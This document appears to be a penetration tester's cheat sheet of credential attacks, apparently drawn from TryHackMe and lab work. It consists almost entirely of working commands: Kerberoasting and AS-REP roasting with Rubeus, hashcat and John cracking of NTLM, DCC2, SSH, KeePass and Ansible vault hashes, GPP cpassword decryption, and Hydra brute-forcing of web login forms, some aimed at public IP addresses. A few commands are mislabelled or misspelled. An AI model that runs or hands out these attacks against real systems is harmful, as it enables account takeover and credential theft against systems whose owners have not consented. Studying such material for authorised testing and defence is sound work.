
hashcat64.exe --help | find "NTLM"
### Kerberoasting 
```
PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

Rubeus kerberoast /outfile:hashes.asreproast


hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

### ASREPRoasting
 
```
Rubeus kerberoast format:hashcat /outfile:hashes.asreproast



hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable


```
### NTLM
```
Wordlist          | hashcat -a 0 -m 400 example400.hash example.dict
Brute-Force       | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a

hashcat64.exe -a 0 -m 1000 C:\Users\NyaMeeEain\Desktop\ntlm.txt rockyou.txt
```
# Domain Cache credential (DCC2)
```
echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 hashes.txt
hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disabl
```
# Avance Cracking Web Forms with Hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -V -s 80 192.168.1.2 http-get /wp-admin/
hydra -l root -P /usr/share/wordlists/rockyou.txt -f -V -s 7001 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"
hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
hydra -l IRISnoir -P /usr/share/wordlists/rockyou.txt -e nsr -v -V http-post-form://testasp.vulnweb.com/"Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"

```

# GPP
```
cat Groups.xml | grep -o 'cpassword="[^"]\+"\|userName="[^"]\+"'

gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```
SSH 
```
/usr/bin/ssh2john Private > Hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt Hash.txt --show
```
### KeePass Cracking
```
keepass2john CEH.kdbx > CEH-CrackMe
john CEH-CrackMe — wordlist=/usr/share/wordlists/rockyou.txt
```

### Ansible
```
cat /etc/ansible/hosts
ansible victims -a "whoami"
ansible victims -a "whoami" --become

hashcat -m 16900 -O -a 0 -w 4 pwm_admin_password_vault.txt  /usr/share/wordlists/rockyou.txt --force
john  credentials.hash --wordlist=/usr/share/wordlists/rockyou.txt
pip install ansible-vault
cat pwm_admin_password_vault | ansible-vault decrypt  | ansible-vault decrypt #After Cracking Password
```


### Web
```
hydra -L users.txt -P passwords.txt -t 1 -w 10 testasp.vulnweb.com http-form-post "/Login.asp:username=^USER^&password=^PASS^:Invalid login! "
hydra -L users.txt -p admin 10.10.192.106 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.106%2Fwp-admin%2F&testcookie=1:Invalid Username"
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 157.245.37.27 -s 31989 http-post-form "/admin_login.php:username=^USER^&password=^PASS^:F=<form name=’log-in’"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.126.149 http-post-form "/Account/login.aspx:__VIEWSTATE=bKQCsSsCvOZiuZNEDamlTXH8ZLMxPT8%2Bkhd%2BFdqZfFS0JJQqTBlfMktVKgrAORXOreqosAX9oGVWS7NO%2BqGD8lNflXkULUqrwpEjStrAlvnTYriDx2uye5kpaJqapjqoDbDF30FXIIBlJpbonU8%2BdF32BXpMdp4CRKN2Y3PmKcyGISBF&__EVENTVALIDATION=T2rEkO%2FXPP6nBkCrOnKeCOj%2FL6Pp%2FLnaFXesNMM3JyD9Vagmv3ciq2zgC45ywBzOnAWYPLWaoHPDgUS4Dfr6jU8LFAbG6Pcb6ncBIRqKPCkMlItpisA8RNBAt8hffRodwkiDkf5R2DsQAiCKiIKxNLyt%2BBOwwTyAMmiIDfBiP8orqvLq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in&Login=Login:Login failed" -V
#Jenkins
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8000 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -V
hydra -l milesdyson -P /home/manny/Desktop/Tryhackme/offensive-pathway/advanced-exploitation/skynet/smb/anonymous/passwords.txt 10.10.157.95 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1&Login=Login:Unknown user or password incorrect" -V
```

### NTLM
```
3000 LM
1000 NTLM
hashcat --help |grep LM  
hashcat -a 3 hash.txt ?l?l?l?l -m 1000  --force
hashcat -a 3 hash.txt ?d?d?d?d?d?d -m 1000  --force 
hashcat -a 3 Hash.txt ?d?d?d?d?d?d?d?d?l?u -m 1000  --force /usr/share/wordlists/rockyou.txt
hashcat -a 3 hash.txt -m 1000 --potfile-disable --force -o wow.txt /usr/share/wordlists/rockyou.txt
hashcat -a 3 hash.txt -m 1000 --potfile-disable --force -o crack.txt

john hash.txt --format=NT 
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```
